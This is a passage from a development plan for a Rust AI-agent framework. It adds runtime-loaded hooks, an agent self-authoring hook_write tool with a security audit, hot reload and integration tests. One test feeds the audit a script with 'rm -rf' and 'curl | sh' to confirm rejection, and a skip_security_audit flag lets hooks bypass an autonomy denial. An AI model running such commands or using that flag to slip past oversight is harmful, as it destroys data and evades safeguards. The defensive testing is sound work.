      2. Set skip_security_audit: true in config
      3. Call HookWriteTool with valid hook content
      4. Assert hook created successfully despite autonomy denial
    Expected Result: Hook created, audit skipped
    Evidence: .sisyphus/evidence/task-10-skip-audit-bypass.txt

  Scenario: Security audit rejects dangerous hook content
    Tool: Bash (cargo test)
    Steps:
      1. Configure autonomy policy to allow hook writing
      2. Call HookWriteTool with script containing shell chaining (rm -rf, curl | sh)
      3. Assert ToolResult contains rejection with specific audit findings
    Expected Result: Write rejected with audit failure details
    Evidence: .sisyphus/evidence/task-10-audit-reject-dangerous.txt
  ```

  **Commit**: YES
  - Message: `feat(tools): add hook_write tool for agent self-authoring with security gate`
  - Files: `src/tools/hook_write.rs`, `src/tools/mod.rs`
  - Pre-commit: `cargo test tools::hook_write`

- [ ] 11. Hot-Reload Stamp Detection in Channel Message Loop

  **What to do**:
  - Add `maybe_reload_hooks()` function mirroring `maybe_apply_runtime_config_update()` pattern in `src/channels/mod.rs:614-682`
  - On each message event, check if `{data_dir}/hooks_reload.stamp` exists and is newer than last check
  - If stamp detected: re-scan hooks directory, parse all HOOK.toml files, call `HookRunner::reload_dynamic_hooks()` from Task 7
  - Delete stamp file after successful reload
  - Add timeout: if hook loading takes >5s, log warning and skip (don't block message processing)
  - RED: Test stamp detection, reload trigger, stamp cleanup, timeout behavior
  - GREEN: Implement stamp polling in message loop
  - REFACTOR: Share stamp-file utility with CLI reload command (Task 9)

  **Must NOT do**: Do not use `notify` crate or file watchers; do not block message processing on reload failure; do not reload on every message — only when stamp is newer than last check timestamp

  **Agent**: `unspecified-high`, Skills: []
  **Parallelization**: Wave 3, Blocks: 12. Blocked By: 5, 6, 7

  **References**:
  - `src/channels/mod.rs:614-682` — `maybe_apply_runtime_config_update()` stamp-based polling pattern (MIRROR THIS EXACTLY)
  - `src/hooks/runner.rs` — `reload_dynamic_hooks()` method from Task 7
  - `src/config/schema.rs:~1898` — `HooksConfig` for data directory path

  **WHY Each Reference Matters**:
  - `channels/mod.rs:614-682` is THE pattern to follow — same stamp-file approach, same polling location, same error handling style
  - `runner.rs` reload method is what gets called when stamp is detected
  - `schema.rs` HooksConfig tells where to look for stamp file and hooks directory

  **Acceptance Criteria**:
  - [ ] `maybe_reload_hooks()` called on each message event
  - [ ] Stamp file triggers reload of dynamic hooks
  - [ ] Stamp file deleted after successful reload
  - [ ] Reload timeout at 5s with warning log
  - [ ] `cargo test channels` → PASS (existing + new tests)

  **QA Scenarios:**
  ```
  Scenario: Stamp file triggers hook reload
    Tool: Bash (cargo test)
    Steps:
      1. Start with HookRunner containing one dynamic hook
      2. Write new hook to hooks directory
      3. Create stamp file with current timestamp
      4. Call maybe_reload_hooks()
      5. Assert new hook is now registered in HookRunner
      6. Assert stamp file is deleted
    Expected Result: New hook loaded, stamp cleaned up
    Evidence: .sisyphus/evidence/task-11-stamp-reload.txt

  Scenario: No stamp file means no reload
    Tool: Bash (cargo test)
    Steps:
      1. Start with HookRunner containing one dynamic hook
      2. Ensure no stamp file exists
      3. Call maybe_reload_hooks()
      4. Assert HookRunner unchanged
    Expected Result: No reload triggered, no errors
    Evidence: .sisyphus/evidence/task-11-no-stamp-noop.txt

  Scenario: Reload failure does not block message processing
    Tool: Bash (cargo test)
    Steps:
      1. Create stamp file
      2. Put invalid HOOK.toml in hooks directory
      3. Call maybe_reload_hooks()
      4. Assert warning logged
      5. Assert message processing continues (function returns Ok)
      6. Assert stamp file still deleted (to prevent retry loop)
    Expected Result: Warning logged, processing continues, stamp cleaned
    Evidence: .sisyphus/evidence/task-11-reload-failure-resilient.txt
  ```

  **Commit**: YES
  - Message: `feat(channels): add stamp-based hot-reload detection for dynamic hooks`
  - Files: `src/channels/mod.rs`, `src/hooks/reload.rs`
  - Pre-commit: `cargo test channels`

- [ ] 12. Integration Tests — Full Hook Lifecycle

  **What to do**:
  - Create `src/hooks/integration_tests.rs` with end-to-end lifecycle tests:
    - **Create→Load→Fire→Reload→Update→Delete** cycle: scaffold hook via CLI create, load via HookLoader, fire events, modify hook, reload via stamp, verify updated behavior, delete hook, verify clean removal
    - **Cancel propagation**: register modifying hook that cancels, verify downstream action skipped
    - **Timeout enforcement**: register hook with artificial delay >5s, verify timeout triggers and processing continues
    - **Condition evaluation**: register hook with `conditions.channels = ["telegram"]`, fire from telegram context (fires) and discord context (skips)
    - **Priority ordering**: register 3 hooks with priorities 1, 5, 10, verify execution order
    - **Mixed static+dynamic**: register compile-time hook + dynamic hook, verify both fire, reload dynamic only, verify static unaffected
  - RED: Write all integration tests first (they will fail since they depend on Tasks 1-11)
  - GREEN: All tests should pass once Tasks 1-11 are complete
  - REFACTOR: Extract test utilities (mock hook builder, test hook directory setup/teardown)

  **Must NOT do**: Do not duplicate unit tests from individual tasks; do not test internal implementation details — only public API and observable behavior; do not use network or filesystem outside temp directories

  **Agent**: `deep`, Skills: []
  **Parallelization**: Wave 3, Blocks: Final. Blocked By: 8, 9, 10, 11

  **References**:
  - `src/migration.rs:423-663` — Integration test patterns (setup/teardown, temp dirs, assertion style)
  - `src/hooks/traits.rs:25-79` — HookHandler trait (all hook points to test)
  - `src/hooks/runner.rs:19-314` — HookRunner dispatch (verify priority, cancel, timeout)
  - `src/hooks/loader.rs` — HookLoader from Task 4 (load test hooks)
  - `src/tools/hook_write.rs` — HookWriteTool from Task 10 (self-authoring path)
  - `src/channels/mod.rs:614-682` — Stamp-based reload from Task 11

  **WHY Each Reference Matters**:
  - `migration.rs` tests show the project's integration test style — temp dirs, assertions, cleanup
  - `traits.rs` defines all hook points that need coverage
  - `runner.rs` is the core dispatcher being tested end-to-end
  - `loader.rs` and `hook_write.rs` are the creation paths being tested
  - `channels/mod.rs` reload is the hot-reload path being tested

  **Acceptance Criteria**:
  - [ ] Full lifecycle test passes (create→load→fire→reload→update→delete)
  - [ ] Cancel propagation test passes
  - [ ] Timeout enforcement test passes
  - [ ] Condition evaluation test passes
  - [ ] Priority ordering test passes
  - [ ] Mixed static+dynamic test passes
  - [ ] `cargo test hooks::integration_tests` → PASS (all 6+ tests)

  **QA Scenarios:**
  ```
  Scenario: Full hook lifecycle end-to-end
    Tool: Bash (cargo test)
    Steps:
      1. Create temp hooks directory
      2. Scaffold hook via TOML generation (name="lifecycle-test", hooks=["on_llm_output"])
      3. Load hooks via HookLoader
      4. Fire on_llm_output event — assert hook fires
      5. Modify hook script content
      6. Write reload stamp file
      7. Call maybe_reload_hooks()
      8. Fire on_llm_output — assert updated behavior
      9. Delete hook directory
      10. Reload — assert hook no longer fires
    Expected Result: All lifecycle stages work correctly
    Evidence: .sisyphus/evidence/task-12-full-lifecycle.txt

  Scenario: Cancel propagation stops downstream
    Tool: Bash (cargo test)
    Steps:
      1. Register modifying hook returning HookResult::Cancel on before_tool_call
      2. Attempt tool execution through Agent
      3. Assert tool was not executed
      4. Assert appropriate cancellation logged
    Expected Result: Tool execution prevented by hook cancel
    Evidence: .sisyphus/evidence/task-12-cancel-propagation.txt

  Scenario: Timeout prevents hook from blocking
    Tool: Bash (cargo test)
    Steps:
      1. Register hook with artificial 6s delay in on_llm_output
      2. Fire on_llm_output with 5s timeout configured
      3. Assert timeout warning logged
      4. Assert processing completed within ~5s (not 6s)
    Expected Result: Timeout fires, processing continues
    Evidence: .sisyphus/evidence/task-12-timeout-enforcement.txt
  ```

  **Commit**: YES
  - Message: `test(hooks): add integration tests for full hook lifecycle`
  - Files: `src/hooks/integration_tests.rs`, `src/hooks/mod.rs`
  - Pre-commit: `cargo test hooks::integration_tests`

---

## Final Verification Wave (MANDATORY — after ALL implementation tasks)

> 4 review agents run in PARALLEL. ALL must APPROVE. Rejection → fix → re-run.

- [ ] F1. **Plan Compliance Audit** — `oracle`
  Read the plan end-to-end. For each "Must Have": verify implementation exists (read file, run command). For each "Must NOT Have": search codebase for forbidden patterns — reject with file:line if found. Check evidence files exist in `.sisyphus/evidence/`. Compare deliverables against plan.
  Output: `Must Have [N/N] | Must NOT Have [N/N] | Tasks [12/12] | VERDICT: APPROVE/REJECT`

- [ ] F2. **Code Quality Review** — `unspecified-high`
  Run `cargo fmt --all -- --check` + `cargo clippy --all-targets -- -D warnings` + `cargo test`. Review all changed files for: `unwrap()` in non-test code, `unsafe` blocks, `todo!()` macros, unused imports, dead code. Check AI slop: excessive comments, over-abstraction, generic names (data/result/item/temp). Verify all new public APIs have doc comments.
  Output: `Build [PASS/FAIL] | Clippy [PASS/FAIL] | Tests [N pass/N fail] | Files [N clean/N issues] | VERDICT`

- [ ] F3. **Real Manual QA** — `unspecified-high`
  Start from clean state. Execute EVERY QA scenario from EVERY task — follow exact steps, capture evidence. Test cross-task integration: create hook via CLI → load → fire via agent turn → modify → reload via stamp → verify updated behavior → delete. Test edge cases: empty hooks dir, malformed TOML, hook that panics, concurrent reload. Save to `.sisyphus/evidence/final-qa/`.
  Output: `Scenarios [N/N pass] | Integration [N/N] | Edge Cases [N tested] | VERDICT`

- [ ] F4. **Scope Fidelity Check** — `deep`
  For each task: read "What to do", read actual diff (git log/diff). Verify 1:1 — everything in spec was built (no missing), nothing beyond spec was built (no creep). Check "Must NOT do" compliance. Detect cross-task contamination: Task N touching Task M's files. Flag unaccounted changes. Verify no changes to `src/security/` policy defaults.
  Output: `Tasks [12/12 compliant] | Contamination [CLEAN/N issues] | Unaccounted [CLEAN/N files] | VERDICT`

---

## Commit Strategy

| Task | Message | Key Files | Pre-commit |
|------|---------|-----------|------------|
| 1 | `feat(hooks): add HOOK.toml manifest schema and parser` | `src/hooks/manifest.rs` | `cargo test hooks::manifest` |
| 2 | `feat(config): extend HooksConfig with dynamic hook settings` | `src/config/schema.rs` | `cargo test config` |
| 3 | `feat(hooks): add DynamicHookHandler with condition evaluation` | `src/hooks/dynamic.rs` | `cargo test hooks::dynamic` |
| 4 | `feat(hooks): add HookLoader for directory scanning and validation` | `src/hooks/loader.rs` | `cargo test hooks::loader` |
| 5 | `feat(hooks): add security audit for dynamic hook content` | `src/hooks/audit.rs` | `cargo test hooks::audit` |
| 6 | `feat(hooks): add script executor with timeout and sandbox` | `src/hooks/executor.rs` | `cargo test hooks::executor` |
| 7 | `feat(hooks): make HookRunner support runtime registry swap` | `src/hooks/runner.rs` | `cargo test hooks::runner` |
| 8 | `feat(agent): wire HookRunner into Agent::turn() and execute_tool_call()` | `src/agent/agent.rs`, `src/agent/loop_.rs` | `cargo test agent` |
| 9 | `feat(cli): add hooks list/reload/create/audit subcommands` | `src/lib.rs`, `src/main.rs`, `src/hooks/cli.rs` | `cargo test` |
| 10 | `feat(tools): add hook_write tool for agent self-authoring with security gate` | `src/tools/hook_write.rs`, `src/tools/mod.rs` | `cargo test tools::hook_write` |
| 11 | `feat(channels): add stamp-based hot-reload detection for dynamic hooks` | `src/channels/mod.rs`, `src/hooks/reload.rs` | `cargo test channels` |
| 12 | `test(hooks): add integration tests for full hook lifecycle` | `src/hooks/integration_tests.rs` | `cargo test hooks::integration_tests` |

---

## Success Criteria

### Verification Commands
```bash
cargo fmt --all -- --check    # Expected: no formatting issues
cargo clippy --all-targets -- -D warnings  # Expected: no warnings
cargo test                    # Expected: all tests pass (existing + new)
cargo test hooks              # Expected: all hook module tests pass
cargo test hooks::integration_tests  # Expected: all integration tests pass
cargo run -- hooks list       # Expected: prints hook table (empty or with builtins)
cargo run -- hooks create test-hook  # Expected: scaffolds HOOK.toml in hooks dir
cargo run -- hooks audit ./hooks/test-hook  # Expected: audit passes for clean hook
cargo run -- hooks reload     # Expected: writes stamp file, prints confirmation
```

### Final Checklist
- [ ] All "Must Have" present:
  - [ ] HOOK.toml manifest schema with name, version, hooks, conditions, scripts
  - [ ] HooksConfig extended with directory, timeout, max_hooks settings
  - [ ] DynamicHookHandler implementing HookHandler trait
  - [ ] HookLoader scanning directory and producing validated handlers
  - [ ] Security audit blocking dangerous patterns (symlinks, shell chaining, fork bombs)
  - [ ] Script executor with timeout enforcement and panic safety
  - [ ] HookRunner supporting runtime registry swap via RwLock
  - [ ] Agent::turn() and execute_tool_call() wired with hook calls
  - [ ] CLI subcommands: list, reload, create, audit
  - [ ] hook_write tool with autonomy policy gate
  - [ ] Stamp-based hot-reload in channel message loop
  - [ ] Integration tests covering full lifecycle
- [ ] All "Must NOT Have" absent:
  - [ ] No `notify` crate or file watcher dependencies
  - [ ] No Mutex (RwLock only for hook registry)
  - [ ] No auto-reload without explicit stamp trigger
  - [ ] No hook writes outside configured hooks directory
  - [ ] No security audit bypass without explicit skip_security_audit flag
  - [ ] No changes to existing compile-time hook behavior
  - [ ] No changes to security policy defaults
- [ ] All tests pass (cargo test)
- [ ] All evidence files present in .sisyphus/evidence/
